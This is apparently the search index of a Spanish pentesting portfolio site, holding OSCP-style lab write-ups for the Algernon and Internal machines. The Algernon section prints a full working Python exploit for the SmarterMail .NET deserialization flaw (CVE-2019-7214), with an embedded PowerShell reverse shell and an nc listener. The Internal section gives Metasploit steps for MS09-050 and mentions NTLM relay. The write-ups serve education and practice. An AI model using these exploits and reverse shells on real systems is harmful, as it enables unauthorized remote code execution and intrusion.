{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Gonzalo Zumaquero \u2014 Ciberseguridad","text":"<p>Sitio t\u00e9cnico con foco en seguridad ofensiva, que re\u00fane writeups de m\u00e1quinas orientados a OSCP, un Bug Bounty Diary y proyectos propios (incluido AutoVPN del TFM).</p> <p>Este portal prioriza reproducibilidad, metodolog\u00eda clara y cumplimiento de buenas pr\u00e1cticas (responsible disclosure y publicaci\u00f3n solo de m\u00e1quinas retiradas o entornos propios).</p>"},{"location":"#navegacion-rapida","title":"Navegaci\u00f3n r\u00e1pida","text":"<ul> <li>Writeups Bug Bounty Diary Proyectos</li> </ul>"},{"location":"#perfil-profesional","title":"Perfil profesional","text":"<ul> <li>Ingenier\u00eda con foco en automatizaci\u00f3n, scripting y sistemas Linux.</li> <li>Pentesting: enumeraci\u00f3n, explotaci\u00f3n, privesc, pivoting y AD b\u00e1sico.</li> <li>Certificaci\u00f3n: eJPTv2. En preparaci\u00f3n: OSCP.</li> </ul>"},{"location":"#estandares-editoriales","title":"Est\u00e1ndares editoriales","text":"<ul> <li>Estructura uniforme en writeups: Recon \u2192 Explotaci\u00f3n \u2192 Escalada \u2192 Evidencias \u2192 Lecciones.</li> <li>Comandos anotados y versiones de herramientas.</li> <li>Se\u00f1alizaci\u00f3n de riesgos y mitigaciones cuando procede.</li> </ul>"},{"location":"#contenidos-destacados","title":"Contenidos destacados","text":""},{"location":"#writeups","title":"Writeups","text":"<ul> <li> <p>NIBBLES (Linux) \u2014 Enumeraci\u00f3n web, explotaci\u00f3n inicial y privesc. Abrir</p> </li> <li> <p>ALGERNON (Windows) \u2014 Servicios internos, credenciales y privesc por abuso de servicios. Abrir</p> </li> <li> <p>INTERNAL (Mixto) \u2014 SMB/HTTP, movimiento lateral y pivoting en red simulada. Abrir</p> </li> </ul>"},{"location":"#bug-bounty-diary","title":"Bug Bounty Diary","text":"<p>Bit\u00e1cora metodol\u00f3gica: scoping, reconocimiento, IDOR/XSS/SSRF, payloads gen\u00e9ricos y patrones. Ver \u00edndice</p>"},{"location":"#proyectos","title":"Proyectos","text":"<ul> <li>AutoVPN (TFM) \u2014 Plataforma para automatizaci\u00f3n de VPNs personales (WireGuard/OpenVPN) con enfoque en seguridad y despliegue reproducible. M\u00e1s detalles</li> </ul>"},{"location":"#ultimas-actualizaciones","title":"\u00daltimas actualizaciones","text":"<ul> <li>Sitio desplegado con MkDocs Material (navegaci\u00f3n con pesta\u00f1as, buscador, copia de c\u00f3digo).</li> <li>Publicados tres writeups iniciales.</li> <li>Preparaci\u00f3n de estructura para Bug Bounty Diary y Proyectos.</li> </ul>"},{"location":"#contacto","title":"Contacto","text":"<ul> <li>GitHub: https://github.com/gonzalozumaquero  </li> <li>LinkedIn: https://www.linkedin.com/in/gonzalozumaquero</li> </ul> <p>\u00bfFeedback o sugerencias? Abre un issue en el repositorio.</p>"},{"location":"#-","title":"----------------------","text":""},{"location":"#docswriteupsnibblesmd","title":"docs/writeups/NIBBLES.md","text":""},{"location":"#coloca-tu-contenido-real-aqui-manten-titulos-y-estructura","title":"(coloca tu contenido real aqu\u00ed; mant\u00e9n t\u00edtulos y estructura)","text":""},{"location":"#-_1","title":"----------------------","text":""},{"location":"#nibbles-linux-writeup","title":"NIBBLES (Linux) \u2014 Writeup","text":"<p>Publicado solo con fines educativos. M\u00e1quina retirada / laboratorio propio.</p>"},{"location":"#reconocimiento","title":"Reconocimiento","text":""},{"location":"#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"#escalada-de-privilegios","title":"Escalada de privilegios","text":""},{"location":"#evidencias","title":"Evidencias","text":""},{"location":"#lecciones-aprendidas","title":"Lecciones aprendidas","text":""},{"location":"#-_2","title":"----------------------","text":""},{"location":"#docswriteupsalgernonmd","title":"docs/writeups/ALGERNON.md","text":""},{"location":"#-_3","title":"----------------------","text":""},{"location":"#algernon-windows-writeup","title":"ALGERNON (Windows) \u2014 Writeup","text":"<p>Publicado solo con fines educativos. M\u00e1quina retirada / laboratorio propio.</p>"},{"location":"#reconocimiento_1","title":"Reconocimiento","text":""},{"location":"#explotacion_1","title":"Explotaci\u00f3n","text":""},{"location":"#escalada-de-privilegios_1","title":"Escalada de privilegios","text":""},{"location":"#evidencias_1","title":"Evidencias","text":""},{"location":"#lecciones-aprendidas_1","title":"Lecciones aprendidas","text":""},{"location":"#-_4","title":"----------------------","text":""},{"location":"#docswriteupsinternalmd","title":"docs/writeups/INTERNAL.md","text":""},{"location":"#-_5","title":"----------------------","text":""},{"location":"#internal-mixto-writeup","title":"INTERNAL (Mixto) \u2014 Writeup","text":"<p>Publicado solo con fines educativos. M\u00e1quina retirada / laboratorio propio.</p>"},{"location":"#reconocimiento_2","title":"Reconocimiento","text":""},{"location":"#explotacion_2","title":"Explotaci\u00f3n","text":""},{"location":"#escalada-de-privilegios_2","title":"Escalada de privilegios","text":""},{"location":"#evidencias_2","title":"Evidencias","text":""},{"location":"#lecciones-aprendidas_2","title":"Lecciones aprendidas","text":""},{"location":"#-_6","title":"----------------------","text":""},{"location":"#docsbugbountyreadmemd","title":"docs/bugbounty/README.md","text":""},{"location":"#-_7","title":"----------------------","text":""},{"location":"#bug-bounty-diary-indice","title":"Bug Bounty Diary \u2014 \u00cdndice","text":""},{"location":"#metodologia","title":"Metodolog\u00eda","text":"<ul> <li>Scoping y l\u00edmites del programa</li> <li>Reconocimiento (pasivo/activo)</li> <li>Testing (IDOR, XSS, SSRF, CSRF)</li> <li>Responsible Disclosure</li> </ul>"},{"location":"#entradas","title":"Entradas","text":"<ul> <li>Semana 1 (pr\u00f3ximamente)</li> <li>Semana 2 (pr\u00f3ximamente)</li> </ul>"},{"location":"#-_8","title":"----------------------","text":""},{"location":"#docsprojectsreadmemd","title":"docs/projects/README.md","text":""},{"location":"#-_9","title":"----------------------","text":""},{"location":"#proyectos_1","title":"Proyectos","text":""},{"location":"#autovpn-tfm","title":"AutoVPN (TFM)","text":"<p>Breve descripci\u00f3n, objetivos, arquitectura y roadmap. Enlace al repositorio cuando sea p\u00fablico.</p>"},{"location":"#pentesting-scripts","title":"Pentesting Scripts","text":"<p>Utilidades para acelerar enumeraci\u00f3n y post-explotaci\u00f3n. Publicaci\u00f3n progresiva.</p>"},{"location":"#-_10","title":"----------------------","text":""},{"location":"#docsstylesheetsextracss","title":"docs/stylesheets/extra.css","text":""},{"location":"#-_11","title":"----------------------","text":"<p>/ Ajustes visuales suaves para aspecto profesional / .md-content { max-width: 1100px; } .md-typeset h1 { margin-top: 0.4rem; margin-bottom: 0.6rem; } .md-typeset h2 { margin-top: 1.2rem; } .md-typeset a.md-button { margin-right: 0.5rem; }</p> <p>/ C\u00f3digo un poco m\u00e1s legible / .highlight code, code, pre code { font-size: 0.94rem; }</p> <p>/ Imagen de logo si la usas en el header / .md-header__button.md-logo img { height: 28px; }</p>"},{"location":"writeups/ALGERNON/","title":"ALGERNON (Windows)","text":"","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#informacion-general","title":"Informaci\u00f3n General","text":"<ul> <li>Nombre de la m\u00e1quina: Algernon</li> <li>Direcci\u00f3n IP: 192.168.144.65</li> <li>Sistema Operativo: Windows</li> <li>Nivel de dificultad: Easy</li> <li>Fecha de resoluci\u00f3n: 12/08/2025</li> <li>Autor: Gonzalo Zumaquero And\u00fajar</li> </ul>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#reconocimiento-inicial","title":"Reconocimiento Inicial","text":"","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#escaneo-de-puertos-abiertos-nmap","title":"Escaneo de puertos abiertos - Nmap","text":"<p><pre><code>sudo nmap -p- --open -T3 -Pn -sS -vvv $IP -oG allPorts  \n</code></pre> Puertos: 80,135,139,17001,21,445,49664,49665,49666,49667,49668,49669,5040,9998</p>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#escaneo-de-servicios-en-los-puertos-descubiertos-nmap","title":"Escaneo de servicios en los puertos descubiertos - Nmap","text":"<p><pre><code>nmap -sCV $IP -oA services -vvv -p80,135,139,17001,21,445     \n</code></pre> Resultados de servicios:</p> PORT SERVICE VERSION 21 ftp Microsoft ftpd Anonymous FTP login allowed 80 http Microsoft IIS httpd 10.0 OPTIONS TRACE GET HEAD POST 135 msrpc Microsoft Windows RPC 139 netbios-ssn Microsoft Windows netbios-ssn 445 microsoft-ds ? 17001 remoting MS .NET Remoting services 9998 http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#servicio-ftp-en-puerto-22","title":"Servicio ftp en puerto 22","text":"<p>Exploraci\u00f3n inicial en el servidor #ftp, intentando obtener todo el contenido disponible</p> <p><pre><code>get -r \"ftp://anonymous:anonymous@$IP\"\n</code></pre> Obtenidos los siguentes ficheros:</p> <p></p> <p>Sin resultados o vulnerabilidades encontradas</p>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#servicio-htttp-en-puerto-9998","title":"Servicio htttp en puerto 9998","text":"<p>Se realiza una exploraci\u00f3n directa con el explorador, se aplica un redirect:</p> <p></p>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#explotacion","title":"Explotaci\u00f3n","text":"<ul> <li>Descripci\u00f3n de la vulnerabilidad explotada: vulnerabilidad en SmarterMail que consiste en deserializaci\u00f3n insegura en .NET Remoting.</li> <li>Exploit utilizado: CVE-2019-7214</li> <li>Adaptaciones realizadas al exploit: modificada ip m\u00e1quina victima y puerto para revershell</li> <li>Payload generado: <pre><code>#!/usr/bin/python3\nimport base64\nimport socket\nimport sys\nfrom struct import pack\nHOST='192.168.179.65'\nPORT=17001\nLHOST='192.168.45.176'\nLPORT=4444\npsh_shell = '$client = New-Object System.Net.Sockets.TCPClient(\"'+LHOST+'\",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 =$sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\npsh_shell = psh_shell.encode('utf-16')[2:] # remove BOM\npsh_shell = base64.b64encode(psh_shell)\npsh_shell = psh_shell.ljust(1360, b' ')\npayload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAPIKL2MgcG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw=='\npayload = base64.b64decode(payload)\npayload = payload.replace(bytes(\"X\"*1360, 'utf-8'), psh_shell)\nuri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST,PORT)) \nmsg = bytes()\nmsg += b'.NET'                 # Header\nmsg += b'\\x01'                 # Version Major\nmsg += b'\\x00'                 # Version Minor\nmsg += b'\\x00\\x00'             # Operation Type\nmsg += b'\\x00\\x00'             # Content Distribution\nmsg += pack('I', len(payload)) # Data Length\nmsg += b'\\x04\\x00'             # URI Header\nmsg += b'\\x01'                 # Data Type\nmsg += b'\\x01'                 # Encoding - UTF8\nmsg += pack('I', len(uri))     # URI Length\nmsg += uri                     # URI\nmsg += b'\\x00\\x00'             # Terminating Header\nmsg += payload                 # Data\ns.send(msg)\ns.close()\n</code></pre></li> </ul> <p>Este exploit:</p> <ul> <li>Payload principal (.NET deserialization)<ul> <li>Abusa de la deserializaci\u00f3n insegura de objetos .NET en un servicio expuesto.</li> <li>Al deserializar en el servidor, se ejecuta el comando <code>powershell.exe -encodedCommand &lt;base64&gt;</code>, lanzando la conexi\u00f3n inversa.</li> </ul> </li> <li>Env\u00edo del exploit<ul> <li>Construye manualmente un mensaje con cabecera <code>.NET</code> + versi\u00f3n/protocolo.</li> <li>Inserta la URI destino: <code>tcp://192.168.179.65:17001/Servers</code>.</li> <li>A\u00f1ade el payload serializado y lo env\u00eda por socket TCP al servicio. </li> <li>Inyecta un payload que ejecuta un PowerShell reverse shell hacia el atacante.</li> </ul> </li> <li>Una vez lanzado, el atacante recibe en su m\u00e1quina (<code>192.168.45.176:4444</code>) una shell de PowerShell con el contexto del proceso vulnerable.</li> </ul> <p>Se pone la m\u00e1quina atacante en escucha para establecer la tty:</p> <pre><code>rlwrap -cAr nc -lvnp 4444\n</code></pre> <p>Finalmente se obtiene acceso con una shell remota:</p> <p></p>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#flags","title":"\ud83c\udfc1 Flags","text":"<ul> <li>root.txt \u2192 4c91467137515cd6a1f0afb90b36a913</li> </ul> <p>Capturas de pantalla:</p> <p></p>","tags":["http","reverse-shell","python"]},{"location":"writeups/ALGERNON/#lecciones-aprendidas","title":"Lecciones aprendidas","text":"<ul> <li>T\u00e9cnicas nuevas descubiertas: lanzar una rshell mejorada con rlwrap</li> <li>Errores cometidos y c\u00f3mo evitarlos en el futuro:<ul> <li>Documentaci\u00f3n deber\u00eda estar en ingl\u00e9s</li> <li>No he seguido un m\u00e9todo de an\u00e1lisis con procedimientos</li> <li>No he capturado la shell desde el inicio</li> </ul> </li> </ul>","tags":["http","reverse-shell","python"]},{"location":"writeups/INTERNAL/","title":"INTERNAL (Mixto)","text":"","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#informacion-general","title":"Informaci\u00f3n General","text":"<ul> <li>Nombre de la m\u00e1quina: Internal</li> <li>Direcci\u00f3n IP: 192.168.228.40</li> <li>Sistema Operativo: Windows 2008</li> <li>Nivel de dificultad: Easy </li> <li>Fecha de resoluci\u00f3n: 18/08/2025</li> <li>Autor: Gonzalo Zumaquero And\u00fajar</li> </ul>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#reconocimiento-inicial","title":"Reconocimiento Inicial","text":"","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#escaneo-de-puertos-nmap","title":"Escaneo de puertos - Nmap","text":"<p><pre><code>nmap -p- --open -sS -Pn -T4 -D RND:10 -vvv $IP -oG ports \n</code></pre> Puertos abiertos: 135,139,3389,445,49153,49155,49156,49157,49158,53</p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#escaneo-de-servicios-en-puertos-abiertos-nmap","title":"Escaneo de servicios en puertos abiertos - Nmap","text":"<pre><code>nmap -sC -sV -p&lt;puertos_detectados&gt; -oN scans/detailed.txt &lt;IP&gt;\n</code></pre> PORT SERVICE VERSION 53 domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1) 135 msrpc Microsoft Windows RPC 139 netbios-ssn Microsoft Windows netbios-ssn 445 microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds 3389 ms-wbt-server Microsoft Terminal Service 49153 msrpc Microsoft Windows RPC 49155 msrpc Microsoft Windows RPC 49156 msrpc Microsoft Windows RPC 49157 msrpc Microsoft Windows RPC 49158 msrpc Microsoft Windows RPC","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#enumeracion-inicial","title":"Enumeraci\u00f3n inicial","text":"<p>Se trata de una revisi\u00f3n r\u00e1pida de vulnerabilidades para los servicios encontrados, tras esta revisi\u00f3n si no se encontrara nada relevante, se realizar\u00eda una revisi\u00f3n avanzada</p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#puerto-53-servicio-de-dominio-serviciosdns-dns","title":"PUERTO 53 SERVICIO DE DOMINIO [[SERVICIOS/DNS]] #DNS","text":"<p>Se ha encontrado posible nombre de direcci\u00f3n DNS durante el reconocimiento inicial \"internal\", se a\u00f1ade al /etc/hosts y se realiza un ping al dominio:</p> <p></p> <p>DOMINIO ENCONTRADO: internal</p> <p>Se intenta realizar una trasferencia de zona sin resultados: <pre><code>dig @$IP axfr internal\n</code></pre> SIN RESULTADOS</p> <p>Se realizan comprobaciones para ver si se detecta el tipo de DNS: <pre><code>dig version.bind CHAOS TXT $IP &gt; dnsScann \n</code></pre> SIN RESULTADOS</p> <p>Lectura del registro TXT: <pre><code>dig version.bind CHAOS TXT $IP &gt; dnsScann \n</code></pre> SIN RESULTADOS</p> <p>Se realiza una revisi\u00f3n recursiva de AXFR, NSID y cach\u00e9 <pre><code>nmap -sU -sT -p53 $DNS --script \\\ndns-recursion,dns-zone-transfer,dns-nsid,dns-cache-snoop \\\n--script-args dns-zone-transfer.domain=$DOM\n</code></pre> SIN RESULTADOS</p> <p>CONCLUSIONES</p> <ul> <li>Posibles vulnerabilidades: No encontrada</li> <li>Dominio encontrado: Internal </li> <li>Usuarios identificados: No encontados</li> </ul>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#puerto-135-servicio-windows-rpc","title":"PUERTO 135 SERVICIO WINDOWS RPC","text":"<p>Se realiza una comprobaci\u00f3n para ver si el sistema acepta  <pre><code>rpcclient -U '' -N $IP\n</code></pre> SE PERMITE COMUNICACI\u00d3N PERO SIN PERMISOS DE EJECUCI\u00d3N -&gt;  SIN RESULTADOS</p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#puerto-139445-servicios-smb-y-remote-management","title":"PUERTO 139,445 SERVICIOS SMB Y REMOTE MANAGEMENT","text":"<p>Para esta combinaci\u00f3n se ejecutan los siguientes comandos para encontrar alguna pista: <pre><code>enum4linux $IP  \n\nsmbclient -N -L \\\\\\\\$IP\\\\\n</code></pre> SIN RESULTADOS</p> <p>NOTA: \u2018Message signing enabled but not required\u2019. I have not seen anyone really mention this, but be aware that this indicates it is possible to REFLECT credentials from a verified source (like another computer in the AD Network) to gain access. I have use this with impacket-ntlmrelayx to escalate my privileges.</p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#explotacion","title":"Explotaci\u00f3n","text":"<ul> <li>Descripci\u00f3n de la vulnerabilidad explotada: MS09-050</li> <li>Exploit utilizado: revershell de meterpreter</li> </ul> <p>Detecci\u00f3n: <pre><code>nmap -script=smb-vuln\\* -p445 192.168.103.40  \n</code></pre></p> <p>Explotaci\u00f3n: <pre><code>msfconsole\nsearch MS09-050\nuse exploit/windows/smb/ms09_050_smb2_negotiate_func_index\nset RHOSTS 192.168.103.40\nset LHOST 192.168.49.103\nshow options\nrun\n</code></pre> En el lado de la m\u00e1quina atacante no ser\u00e1 necesario poner en escucha ning\u00fan puerto manualmente, se encarga metasploit <pre><code>meterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre></p> <p>Se podr\u00e1 obtener una shell: <pre><code>**meterpreter &gt; shell\nProcess 3484 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.0.6001]\nCopyright (c) 2006 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;hostname\nhostname\ninternal**\n</code></pre></p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#lecciones-aprendidas","title":"Lecciones aprendidas","text":"<ul> <li>A veces es mejor utilizar metasploit, he tenido mucho problema para ejecutar manualemnte la vulnerabilidad a partir del fichero python que hay en github que permite obtener una revershell explotando el buffer-overflow, al final se muestra el script, sin embargo no he podido poner en escucha de forma correcta ya que se establec\u00eda la conexi\u00f3n pero al ejecutar comandos, estos no se ejecutaban.</li> <li>Se ha demostrado la utilidad de los scripts de vulnerabilidades de nmap, son r\u00e1pidos y efectivos si se detecta, por eso se a\u00f1ade una secci\u00f3n en el cheatsheet de nmap para realizar b\u00fasquedas de script de NSE de nmap</li> 